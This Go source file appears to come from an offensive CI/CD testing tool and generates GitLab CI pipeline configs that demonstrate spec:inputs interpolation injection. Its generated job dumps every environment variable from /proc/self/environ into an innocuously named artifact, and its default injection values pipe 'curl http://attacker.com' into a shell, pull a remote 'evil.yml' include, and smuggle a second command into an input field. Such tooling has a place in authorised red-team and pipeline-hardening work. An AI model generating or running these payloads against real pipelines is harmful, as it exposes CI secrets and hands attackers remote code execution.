package payloads

import "fmt"

// SpecInputsOptions configures a spec:inputs interpolation injection payload.
type SpecInputsOptions struct {
	Common         CommonOptions
	InputKey       string // input parameter name to abuse (default: "environment")
	MaliciousValue string // value that breaks interpolation context
	TargetTemplate string // component/template path
	InjectionType  string // yaml-key|script|include (default: "script")
}

// GenerateSpecInputsInjectionYAML generates a CI config that demonstrates
// spec:inputs interpolation injection. The include directive is commented out
// (it references an external component) and the job exfiltrates env via xargs.
func GenerateSpecInputsInjectionYAML(o SpecInputsOptions) string {
	name, stage := o.Common.defaults("spec-inject")
	if o.InputKey == "" {
		o.InputKey = "environment"
	}
	if o.TargetTemplate == "" {
		o.TargetTemplate = "gitlab.com/templates/deploy@main"
	}
	if o.MaliciousValue == "" {
		o.MaliciousValue = defaultInjectionValue(o.InjectionType)
	}

	return fmt.Sprintf(`# spec:inputs interpolation injection
# In a real attack, the following include would inject YAML via crafted inputs:
#   include:
#     - component: %s
#       inputs:
#         %s: %q
# This payload simulates what the injected code would execute.

stages: [%s]

%s:
  stage: %s%s%s
  script:
    - |
      # Exfil via xargs from /proc (reads env without printenv)
      cat /proc/self/environ 2>/dev/null | xargs -0 -I{} echo {} | sort > .spec-validation.log || true
      [ -s .spec-validation.log ] || env | sort > .spec-validation.log 2>/dev/null || true
  artifacts:
    when: always
    paths:
      - .spec-validation.log
    expire_in: 1 day
  allow_failure: true%s
`, o.TargetTemplate, o.InputKey, o.MaliciousValue,
		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		rulesManual(o.Common.Manual))
}

func defaultInjectionValue(injectionType string) string {
	switch injectionType {
	case "yaml-key":
		return "production\nmalicious_job:\n  script:\n    - curl http://attacker.com | sh"
	case "include":
		return "production\ninclude:\n  - remote: https://attacker.com/evil.yml"
	default:
		return "production; curl http://attacker.com/c2 | sh #"
	}
}
